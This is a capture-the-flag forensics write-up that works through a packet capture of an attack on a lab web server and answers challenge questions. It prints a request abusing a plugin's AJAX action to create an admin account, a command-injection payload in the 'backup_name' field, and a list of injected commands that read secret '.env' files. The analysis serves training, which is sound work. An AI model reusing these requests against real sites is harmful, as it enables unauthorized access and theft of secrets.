---
layout: post
title:  "Forensics Challenges"
date:   2026-06-29 14:26:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /v1t-CTF-2026-forensics/
---

**Title**: BasicQnA

**Category**: forensics

**Description**: An amateur attacker’s perspective. Answer all questions to get the flag. `https://basicqna.v1t.site`

I get the challenge file:
```shell
file challenge.pcapng  
challenge.pcapng: pcapng capture file - version 1.0
```

I opened the pcap in wireshark. There is almost 51000 packets.

Q1. What are the attacker IP address and victim IP address?

Format: attackerIP,victimIP

`172.29.9.159,13.212.67.96`

Q2. What SSH service/version is running on the victim?

Format: service_version distro_version

`SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.2`

Q3. What tool did the attacker use for reconnaissance?

`nmap`

Q4. Which TCP stream shows that the attacker successfully created a temporary admin account?

Format: tcp.stream eq XXXX

`tcp.stream eq 4491`

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 13.212.67.96
User-Agent: curl/8.18.0
Accept: */*
Content-Length: 75
Content-Type: application/x-www-form-urlencoded

action=wpgmp_temp_access_ajax&nonce=fc-call-nonce-7d91c2c0&check_temp=false
HTTP/1.1 200 OK
```

```shell
Server: gunicorn
Date: Wed, 24 Jun 2026 08:25:26 GMT
Connection: close
Content-Type: application/json
Content-Length: 199
Vary: Cookie

{"message":"Temporary support access created.","role":"admin","success":true,"support_url":"http://13.212.67.96/magic-login/GsheBj53E0_rg1qnYAnIQYgNBJcGMzbL","user":"support_c30cde@corpvault.local"}
```

Q5. What is the temporary admin account created by the attacker?

Format: username@domain

`support_c30cde@corpvault.local`

Q6. What is the CVE of the abused technique?

`CVE-2026-8732` [https://github.com/advisories/ghsa-v837-vph9-gcrq](https://github.com/advisories/ghsa-v837-vph9-gcrq)

Q7. Which user-controlled parameter in the backup feature was abused to achieve RCE?

`backup_name`

```http
POST /admin/maintenance HTTP/1.1
Host: 13.212.67.96
User-Agent: curl/8.18.0
Accept: */*
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjo1fQ.ajuUhA.G8eFgLwazJtc_CGXYCk21RXVBA4
Content-Length: 69
Content-Type: application/x-www-form-urlencoded

backup_name=daily-contracts%3B+echo+HOME%3D%24HOME%3B+pwd%3B+ls+-la+~
```

Q8. What are the two files that the attacker read to obtain the victim's information after gaining command execution?

Format: path1,path2

`/app/static/.env,/app/templates/.env`

```shell
tshark -r challenge.pcapng -Y "ip.src == 172.29.9.159 && frame contains \"backup_name\"" -T fields -e http.file_data  
6261636b75705f6e616d653d6461696c792d636f6e7472616374732533422b6563686f2b484f4d45253344253234484f4d452533422b7077642533422b6c732b2d6c612b7e  
6261636b75705f6e616d653d6461696c792d636f6e7472616374732533422b6563686f2b484f4d45253344253234484f4d452533422b77686f616d69  
6261636b75705f6e616d653d6461696c792d636f6e7472616374732533422b77686f616d692533422b6563686f2b484f4d45253344253234484f4d452533422b7077642533422b6c732b2d6c612b253246686f6d6525334  
...etc
```

All commands ran:
```shell

=daily-contracts; echo HOME=$HOME; pwd; ls -la ~
=daily-contracts; echo HOME=$HOME; whoami
=daily-contracts; whoami; echo HOME=$HOME; pwd; ls -la /home; ls -la /root
=daily-contracts; whoami; ls /
=daily-contracts; whoami; ls /tmp
=daily-contracts; whoami; ls /usr
=daily-contracts; whoami; ls /app
=daily-contracts; whoami; ls /var
=daily-contracts; whoami; ls 
=daily-contracts; whoami; ls /var
=daily-contracts; whoami; ls /
=daily-contracts; whoami; ls /mnt
=daily-contracts; whoami; ls /mnt
=daily-contracts; whoami; ls /mnt
=daily-contracts; whoami; ls /mnt
=daily-contracts; whoami; ls /
=daily-contracts; whoami; ls /tmp
=daily-contracts; whoami; ls /etc
=daily-contracts; whoami; ls /
=daily-contracts; whoami; ls /var
=daily-contracts; find
=daily-contracts; cd / ; find . -name "*.txt"
=daily-contracts; find . -name "*.txt"
=daily-contracts; sudo find / -name "*.txt"
=daily-contracts; ls -la /
=daily-contracts; ls -la /root
=daily-contracts; ls -la /home
=daily-contracts; ls -la /usr
=daily-contracts; ls -la /dev
=daily-contracts; ls -la /proc
=daily-contracts; ls -la /var
=daily-contracts; ls -la /var
=daily-contracts; ls -la /var/tmp
=daily-contracts; cat /var/tmp/secret.txt
=daily-contracts; ls /app
=daily-contracts; ls /app/templates
=daily-contracts; ls /app/static
=daily-contracts; ls -la /app/static
=daily-contracts; cat /app/static/.env
=daily-contracts; ls -la /app/templates
=daily-contracts; cat /app/templates/.env
```

[cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')URL_Decode(true)Find_/_Replace(%7B'option':'Regex','string':'backup_name'%7D,'%5C%5Cn',true,false,true,false)&input=NjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2NTYzNjg2ZjJiNDg0ZjRkNDUyNTMzNDQyNTMyMzQ0ODRmNGQ0NTI1MzM0MjJiNzA3NzY0MjUzMzQyMmI2YzczMmIyZDZjNjEyYjdlCjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNjU2MzY4NmYyYjQ4NGY0ZDQ1MjUzMzQ0MjUzMjM0NDg0ZjRkNDUyNTMzNDIyYjc3Njg2ZjYxNmQ2OQo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNjU2MzY4NmYyYjQ4NGY0ZDQ1MjUzMzQ0MjUzMjM0NDg0ZjRkNDUyNTMzNDIyYjcwNzc2NDI1MzM0MjJiNmM3MzJiMmQ2YzYxMmIyNTMyNDY2ODZmNmQ2NTI1MzM0MjJiNmM3MzJiMmQ2YzYxMmIyNTMyNDY3MjZmNmY3NAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDY3NDZkNzAKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI3NzY4NmY2MTZkNjkyNTMzNDIyYjZjNzMyYjI1MzI0Njc1NzM3Mgo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2NjE3MDcwCjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDY3NjYxNzIKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI3NzY4NmY2MTZkNjkyNTMzNDIyYjZjNzMyYgo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2NzY2MTcyCjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDYKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI3NzY4NmY2MTZkNjkyNTMzNDIyYjZjNzMyYjI1MzI0NjZkNmU3NAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2NmQ2ZTc0CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDY2ZDZlNzQKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI3NzY4NmY2MTZkNjkyNTMzNDIyYjZjNzMyYjI1MzI0NjZkNmU3NAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDY3NDZkNzAKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI3NzY4NmY2MTZkNjkyNTMzNDIyYjZjNzMyYjI1MzI0NjY1NzQ2Mwo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjc3Njg2ZjYxNmQ2OTI1MzM0MjJiNmM3MzJiMjUzMjQ2CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNzc2ODZmNjE2ZDY5MjUzMzQyMmI2YzczMmIyNTMyNDY3NjYxNzIKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2NjY5NmU2NAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjYzNjQyYjI1MzI0NjJiMjUzMzQyMmI2NjY5NmU2NDJiMmUyYjJkNmU2MTZkNjUyYjI1MzIzMjI1MzI0MTJlNzQ3ODc0MjUzMjMyCjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNjY2OTZlNjQyYjJlMmIyZDZlNjE2ZDY1MmIyNTMyMzIyNTMyNDEyZTc0Nzg3NDI1MzIzMgo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjczNzU2NDZmMmI2NjY5NmU2NDJiMjUzMjQ2MmIyZDZlNjE2ZDY1MmIyNTMyMzIyNTMyNDEyZTc0Nzg3NDI1MzIzMgo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjZjNzMyYjJkNmM2MTJiMjUzMjQ2CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNmM3MzJiMmQ2YzYxMmIyNTMyNDY3MjZmNmY3NAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjZjNzMyYjJkNmM2MTJiMjUzMjQ2Njg2ZjZkNjUKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyZDZjNjEyYjI1MzI0Njc1NzM3Mgo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjZjNzMyYjJkNmM2MTJiMjUzMjQ2NjQ2NTc2CjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNmM3MzJiMmQ2YzYxMmIyNTMyNDY3MDcyNmY2Mwo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjZjNzMyYjJkNmM2MTJiMjUzMjQ2NzY2MTcyCjYyNjE2MzZiNzU3MDVmNmU2MTZkNjUzZDY0NjE2OTZjNzkyZDYzNmY2ZTc0NzI2MTYzNzQ3MzI1MzM0MjJiNmM3MzJiMmQ2YzYxMmIyNTMyNDY3NjYxNzIKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyZDZjNjEyYjI1MzI0Njc2NjE3MjI1MzI0Njc0NmQ3MAo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjYzNjE3NDJiMjUzMjQ2NzY2MTcyMjUzMjQ2NzQ2ZDcwMjUzMjQ2NzM2NTYzNzI2NTc0MmU3NDc4NzQKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyNTMyNDY2MTcwNzAKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyNTMyNDY2MTcwNzAyNTMyNDY3NDY1NmQ3MDZjNjE3NDY1NzMKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyNTMyNDY2MTcwNzAyNTMyNDY3Mzc0NjE3NDY5NjMKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyZDZjNjEyYjI1MzI0NjYxNzA3MDI1MzI0NjczNzQ2MTc0Njk2Mwo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjYzNjE3NDJiMjUzMjQ2NjE3MDcwMjUzMjQ2NzM3NDYxNzQ2OTYzMjUzMjQ2MmU2NTZlNzYKNjI2MTYzNmI3NTcwNWY2ZTYxNmQ2NTNkNjQ2MTY5NmM3OTJkNjM2ZjZlNzQ3MjYxNjM3NDczMjUzMzQyMmI2YzczMmIyZDZjNjEyYjI1MzI0NjYxNzA3MDI1MzI0Njc0NjU2ZDcwNmM2MTc0NjU3Mwo2MjYxNjM2Yjc1NzA1ZjZlNjE2ZDY1M2Q2NDYxNjk2Yzc5MmQ2MzZmNmU3NDcyNjE2Mzc0NzMyNTMzNDIyYjYzNjE3NDJiMjUzMjQ2NjE3MDcwMjUzMjQ2NzQ2NTZkNzA2YzYxNzQ2NTczMjUzMjQ2MmU2NTZlNzY)

Q9. What is the found Github ID?

Format: final magic string

`Ich1ck3nPlus`

It was in one of the `.env` files the attacker looked at. 

`v1t{llm_c0uld_s0lv3_th1s_ez_chall3ng3!!!}`
